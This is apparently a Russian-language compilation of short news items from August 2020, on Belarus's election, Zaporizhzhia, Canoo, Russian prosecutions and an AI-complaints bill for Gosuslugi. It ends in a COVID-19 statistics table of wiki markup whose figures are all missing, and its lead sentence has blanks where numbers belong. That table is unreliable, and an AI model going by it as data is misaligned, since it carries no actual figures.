В Испании число случаев коронавируса превысило 364 тысячи, около 29 тысяч человек погибли.
 
Источники

Лидеры стран - членов ЕС считают необходимым проведение в Белоруссии новых президентских выборов. Об этой позиции глав Евросоюза сообщил 19 августа президент Литвы Гитанас Науседа на пресс-конференции по итогам экстренного саммита в формате видеоконференции по ситуации в Белоруссии.
«Разговор шел в унисон. Все признали, что итоги выборов были сфальсифицированы. Они были несвободными и не могут быть признаны. Необходимо создать условия для проведения новых выборов». - сказал он, пишет ТАСС.
Как заявил глава Евросовета Шарль Мишель, Евросоюз намерен в ближайшее время ввести санкции в отношении значительного числа белорусских должностных лиц.
«В ближайшее время мы введем санкции в отношении значительного числа официальных лиц, ответственных за насилие, репрессии и фальсификацию результатов выборов в Белоруссии», - сказал он.
ЕС изучит возможность включения Александра Лукашенко в санкционный список по Белоруссии, добавил Мишель.
Кроме того, в ЕС осудили насилие против протестующих с 9 августа по сей день граждан Белоруссии и потребовали независимого и транспарентного расследования.
Ранее оппозиционный кандидат в президенты Белоруссии Светлана Тихановская попросила ЕС не признавать итоги выборов президента в Белоруссии. Она также инициировала создание национального координационного совета Белоруссии, который объявит новые «честные и демократические» выборы президента с участием международных наблюдателей.
 
Источники

Президенту Владимиру Зеленскому во время его рабочей поездки на Запорожье представили план мероприятий реализации Стратегии развития Запорожской области на период до 2027 года.
Об этом сообщает RegioNews со ссылкой на пресс-службу ОП.
Вице-премьер-министр — министр цифровой трансформации Украины Михаил Федоров, который представлял Стратегию развития региона до 2027 года, отметил: Запорожье — это индустриальный, энергетический, историко-культурный центр Украины и регион с высококвалифицированными кадрами.
В то же время в числе основных проблем, которые необходимо решать, вице-премьер назвал качество жизни, транспортную инфраструктуру и экологическую безопасность.
По его словам, видение развития региона предполагает фокусировку на таких направлениях, как производство двигателей и запчастей для вертолетов, изготовление генераторов и трансформаторов, проводов и кабелей, эндопротезов. Также предполагается развитие логистических хабов, речных и морских портов, аэропортов, IT-отрасли и создание дата-центров, курортно-рекреационных территорий Азовского побережья, историко-туристической инфраструктуры и альтернативной энергетики в степях Приазовья.
Отдельно Федоров отметил необходимость развития малого и среднего бизнеса в области. Для этого в течение года в регионе построят несколько центров поддержки предпринимательства, где будут бесплатно помогать и консультировать представителей бизнеса из Запорожья и области.
 
Михаил Федоров отметил, что существует четыре важнейших перспективных проекта в регионе: достройка моста через Днепр, развитие историко-культурного комплекса «Хортица», водоснабжение в Кирилловке, а также возобновление орошения и дренажа. Кроме того, следующими важными проектами должны стать развитие рекреации в области, в частности речь о Кирилловке и Бердянске.
 
По словам вице-премьер-министра, проекты будут финансироваться из местного и областного бюджетов, из Государственного фонда регионального развития, также будут частные инвестиции, кредитные и донорские средства, будут создавать проекты государственно-частного партнерства.
Федоров также отметил, что в регионе строится и реконструируется восемь школ, пять детских садов, девять приемных отделений и 17 амбулаторий, четыре стадиона и два бассейна. Также сооружается автотранспортная магистраль через реку Днепр, а в Запорожье построили новый аэропорт.
 
После презентации президент Украины отметил необходимость демонстрировать обществу реальные шаги в реализации Стратегии развития.
 
Напомним, сегодня президент Владимир Зеленский представил кандидата в мэры Запорожья.
 
Источники

Американский стартап по производству электромобилей Canoo Holdings заявил о намерении привлечь порядка $2,4 млрд в ходе первичного публичного размещения своих акций на бирже Nasdaq в текущем году.
Сообщается, что Canoo планирует произвести в 2022 году 10 000 автомобилей под собственной маркой, а к 2024 году увеличить число выпущенных транспортных средств до 50 000 единиц.
По словам руководства компании, первый в линейке Canoo семиместный автомобиль будет доступен по подписке для покупателей из США, начиная со второго квартала 2022 года, за ним последуют небольшой коммерческий автомобиль для доставки в 2023 году и спортивный седан в 2025 году.
Стоит отметить, что в феврале 2020 года Canoo и южнокорейский автопроизводитель Hyundai Motor объявили о совместной разработке электромобилей.
 
Источники

В Москве оштрафовали на 10 тысяч участницу пикета в поддержку Цветковой Дарью Шипачеву. Её признали виновной в нарушении правил проведения массовых мероприятий (ч. 5 ст. 20.2 КоАП). Об этом сообщает юрист ОВД-Инфо Екатерина Селезнева. ОВД
27 июня в Москве и Петербурге на одиночных пикетах в поддержку ЛГБТ-активистки Юлии Цветковой, обвиненной в изготовлении порнографии, задержали 43 человека. ОВД-Инфо публиковал список.
9 июня Юлии Цветковой официально предъявили обвинение по статье о распространении порнографии. Дело возбудили из-за публикаций картинок в паблике «Монологи вагины».
В конце марта 2020 года Цветковой вынесли предупреждение о «недопустимости злоупотребления правом на обращение» из-за ее жалоб в полицию на преследование, оскорбления и клевету в ее адрес от противника ЛГБТ Тимура Булатова.
16 марта 2020 года Цветкову отпустили из-под домашнего ареста.
До уголовного преследования Цветкова руководила молодежной театральной студией «МЕРАК», которую пришлось закрыть, так как активистку стали постоянно вызывать в Центр «Э» из-за анонимных жалоб о пропаганде нетрадиционных сексуальных отношений. Несовершеннолетнего бывшего актера театра «МЕРАК» пытались заставить стать потерпевшим по уголовному делу против активистки.
 
Источники

Утром силовики провели обыски как минимум в восьми домах Свидетелей Иеговы в городах Югорск и Советский Ханты-Мансийского автономного округа. Об этом сообщается на сайте «Свидетели Иеговы в России».
Также 15 верующих задержали и увезли для допроса. Подробности пока неизвестны.
В середине февраля 2019 года в Сургуте прошли массовые обыски у Свидетелей Иеговы. Как минимум семь из них рассказали об унижениях, избиениях и пытках электрическим током. СК отказался возбуждать на силовиков уголовное дело, несмотря на заключение независимых экспертов, подтвердившее травмы.
В апреле 2017 года Верховный суд признал «Управленческий центр Свидетелей Иеговы в России» экстремистской организацией и запретил ее деятельность на всей территории страны. В августе того же года все общины Свидетелей Иеговы внесли в список запрещенных.
 
Источники

Заместитель главы Черкасской облгосадминистрации Юрий Лесюк ушел с занимаемой должности.
Эту информацию изданию "Вичерпное" подтвердили в Черкасской ОГА, пишет RegioNews.
Официальное распоряжение о его увольнении на сайте Черкасской ОГА еще не опубликовано, причины увольнения пока неизвестны.
Справка: Юрий Лесюк родился в Черновцах. Окончил Черновицкий государственный медицинский институт. До этого работал заместителем директора Департамента здравоохранения Черновицкой областной государственной администрации.
В Черкасской ОГА он курировал образовательную и медицинскую сферы.
Читайте также: Председатель Черкасской ОГА: Я был настроен "порвать" всю преступность и коррупцию в области за два дня.
 
Источники

Эксперты высказали свои опасения по поводу внедрения искусственного интеллекта в работу портала «Госуслуги» и внесения других изменений в процесс подачи обращений граждан в госорганы, сообщает РБК. В частности, в рамках общественного обсуждения острой критике подверглись предложения, касающиеся обработки жалоб граждан. Споры вызвал выложенный Минцифры на Федеральном портале нормативных правовых актов законопроект, которым вносятся изменения в закон «О порядке рассмотрения обращений граждан России».
Согласно предложенным министерством изменениям, россияне смогут подавать электронные обращения в госорганы только через портал «Госуслуги», и только при условии, что заявитель зарегистрирован в единой системе идентификации и аутентификации (ЕСИА).
По мнению Алины Меженцевой, советника отдела взаимодействия с органами госвласти госкорпорации «Росатом», предлагаемые ограничения на способы направления обращений гражданами, невозможность использовать, например, электронную почту и т. п., на практике могут привести к затруднениям при взаимодействии граждан с государственными органами.
Игорь Селин, зампредседателя общественного совета при администрации города Апатиты, предложил оставить возможность подавать обращения через формы, установленные органами власти и учреждениями на своих сайтах, «так как не все граждане имеют учетные записи на Едином портале Госуслуг. В противном случае для такой категории лиц останется возможность только письменного обращения, что не будет способствовать ускорению рассмотрения обращений и доступности органов власти для граждан».
Проектом ограничивается отправка обращений на бумаге: заявителя вынуждают использовать конкретный вид почтового отправления и нести дополнительные денежные расходы, указала в своем отзыве общественный активист Анастасия Кандина. Требования о необходимости регистрации в ЕСИА или предъявлении документов в МФЦ она считает «избыточным условием получения помощи в реализации или защите своих прав».
Она высказала и опасения по поводу того, что в проекте не дано определение базы знаний, которую предстоит сформировать, и предлагается использовать искусственный интеллект для обработки типовых запросов:
 
Наконец, она указала на противоречие: в проекте говорится, что он не потребует дополнительных расходов из бюджета, а в пояснительной записке написано, что при его реализации потребуется доработка функционала портала Госуслуг.
По мнению Алины Меженцевой, проект потребует доработки ведомственных информационных систем, из-за чего необходимо увеличить срок вступления в силу будущего закона с предложенных в документе 180 дней до одного года.
Предложенный Минцифры проект поправок в закон «О порядке рассмотрения обращений граждан России» предлагает создать единое электронное окно на портале госуслуг. Там же появится рубрикатор типовых жизненных ситуаций, будет сформирована «база знаний», с помощью которой на жалобы россиян вместо реальных людей начнет отвечать искусственный интеллект.
Эти изменения обеспечат «новое качество работы по рассмотрению обращений граждан за счет использования современных цифровых технологий», говорится в пояснительной записке, опубликованной на портале правовой информации.
Законопроект имеет среднюю степень регулирования, и вскоре разработка документа должна перейти к этапу получения заключения по итогам процедуры оценки регулирующего воздействия (ОРВ).
Представитель компании «Ростелеком», которая является оператором портала Госуслуг, в своем отзыве предложил дополнить проект положениями о порядке и сроках обработки поданных через портал электронных обращений в госорганы (сейчас в документе говорится, что это будет определять правительство). Потребуются ли дополнительные расходы из бюджета на реализацию проекта и какими они будут, представитель «Ростелекома» не захотел комментировать. Он лишь сообщил, что компания по поручению Минцифры ведет работу по увеличению мощности портала Госуслуг.
 
Источники

На 14:56 GMT 19 августа 2020 года в мире выявлено SARS-CoV-2 ( случаев). За всё время от коронавирусной инфекции COVID-19 умерло ( ), выздоровело . На данный момент болеют , из них находятся в критическом состоянии. На 1 млн жителей планеты приходится заражённых и умерших.
 
 
 
 }||Мир|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Все||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||США|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бразилия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Индия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Россия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Южно-Африканская Республика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Перу|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мексика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Колумбия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Чили|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Испания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Иран|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Великобритания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Аргентина|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Саудовская Аравия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Пакистан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бангладеш|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Италия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Турция|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Германия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Франция|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ирак|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Филиппины|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Индонезия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Канада|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Катар|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Казахстан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Боливия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Эквадор|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Израиль|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Египет|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Украина|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Доминиканская Республика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Швеция|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Оман|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Панама|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бельгия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Кувейт|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Румыния|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Белоруссия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||ОАЭ|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Нидерланды|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гватемала|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Польша|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Япония|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сингапур|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Португалия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гондурас|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Нигерия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бахрейн|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
